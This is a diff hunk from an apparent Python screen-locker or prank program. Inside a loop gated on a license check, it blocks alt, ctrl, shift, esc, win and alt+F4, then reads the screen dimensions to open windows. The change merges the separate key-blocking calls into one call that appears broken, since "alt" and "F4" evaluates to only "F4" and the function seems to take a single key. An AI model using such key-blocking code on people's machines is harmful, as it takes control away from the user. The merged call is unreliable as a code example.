@@ -46,12 +46,7 @@ elif lic in otvetda:
 
     elif lvl == 2:
         while lvl2:
-            keyboard.block_key("alt")
-            keyboard.block_key("ctrl")
-            keyboard.block_key("shift")
-            keyboard.block_key("esc")
-            keyboard.block_key("win")
-            keyboard.block_key("alt"and"F4")
+            keyboard.block_key("alt","ctrl","shift","esc","win","alt"and"F4")
             _Scr_Width = GetSystemMetrics(0)
             _Scr_Height = GetSystemMetrics(1)
             num_windows = 1
